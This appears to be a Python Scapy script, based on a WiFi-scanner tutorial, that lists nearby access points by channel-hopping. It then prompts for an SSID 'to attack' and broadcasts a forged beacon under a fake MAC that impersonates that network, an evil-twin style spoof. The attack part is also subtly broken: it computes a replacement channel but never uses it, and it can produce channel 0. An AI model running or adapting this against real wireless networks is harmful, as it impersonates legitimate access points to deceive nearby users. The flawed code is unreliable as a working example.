# Source:https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy

from scapy.all import *
from threading import Thread
import pandas
import time
import os
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def print_all():
    # We don't want to loop forever
    while active:
        os.system("clear")
        print(networks)
        time.sleep(0.5)


def change_channel():
    ch = 1
    while active:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

if __name__ == "__main__":
    # Ask user to input the interface, check with ifconfig
    interface = input("Enter the interface : ")
    # Generate random mac
    mac = "00:11:22:33:44:55"
    #mac = Faker().mac_address()
    
    # start the thread that prints all the networks (point 1 and 2)
    active = True
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()

    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start sniffing, stop after 5 seconds
    sniff(prn=callback, iface=interface, timeout=5)

    # stop the printing and channel changer
    active = False
    printer.join()
    channel_changer.join()

    # Ask user to input the SSID to attack (point 3)
    num_ssid = input("Enter the SSID: ")
    while num_ssid not in networks.SSID.values:
        num_ssid = input("Enter the SSID: ")
    
    # Get the original network
    original_network = networks[networks.SSID == num_ssid]
    # Change the channel to a new one
    channel = (original_network.Channel.values[0] + 6) % 14

    # Send the fake beacon (point 4)
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=num_ssid, len=len(num_ssid))
    frame = RadioTap() / dot11 / beacon / essid
    sendp(frame, iface=interface, verbose=0)